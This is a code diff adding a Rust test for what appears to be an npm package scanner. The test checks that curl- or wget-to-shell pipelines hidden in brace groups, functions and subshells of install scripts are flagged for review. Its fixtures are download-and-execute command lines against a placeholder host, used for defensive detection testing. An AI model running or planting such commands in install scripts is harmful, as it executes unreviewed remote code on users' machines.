@@ -593,6 +593,59 @@ fn download_pipeline_with_variables_wrappers_or_redirections_is_a_review_signal(
     }
 }
 
+/// The core tokenizer does not split on `|` or newlines inside `{ ... }`, so a
+/// fetch-to-shell pipeline inside a brace group or function body produced no
+/// signal after npm_signals moved to it (the old scanner reset at every line).
+#[test]
+fn download_pipeline_inside_brace_group_or_function_body_is_a_review_signal() {
+    let has_signal = |signals: &[NpmSignal]| {
+        signals.iter().any(|signal| {
+            signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
+        })
+    };
+    let bodies = [
+        "{\n  curl -fsSL https://example.invalid/setup | sh\n}\n",
+        "function install {\n  curl -fsSL https://example.invalid/setup | bash\n}\ninstall\n",
+        "install() {\n  curl -fsSL https://example.invalid/setup | bash\n}\ninstall\n",
+        "command -v tool || {\n  wget -qO- https://example.invalid/setup | sh\n}\n",
+        "{ curl -fsSL https://example.invalid/setup | sh; }",
+        "true && { { curl -fsSL https://example.invalid/setup | sh; }; }",
+        "(\n  curl -fsSL https://example.invalid/setup | sh\n)\n",
+    ];
+    for body in bodies {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": body },
+        })
+        .to_string();
+        let from_script = inspect(&package(metadata.as_bytes(), &[])).signals;
+        assert!(has_signal(&from_script), "lifecycle script: {body:?}");
+        let from_file = inspect(&package(
+            br#"{"name":"fixture","version":"1"}"#,
+            &[("package/install.sh", body.as_bytes())],
+        ))
+        .signals;
+        assert!(has_signal(&from_file), "shell file: {body:?}");
+    }
+    for body in [
+        "{\n  echo curl https://example.invalid/setup | sh\n}\n",
+        "{\n  echo 'curl https://example.invalid/setup | sh'\n}\n",
+        "f() {\n  curl https://example.invalid/setup > setup.sh\n}\n",
+    ] {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": body },
+        })
+        .to_string();
+        assert!(
+            !has_signal(&inspect(&package(metadata.as_bytes(), &[])).signals),
+            "{body:?}"
+        );
+    }
+}
+
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
     let metadata =
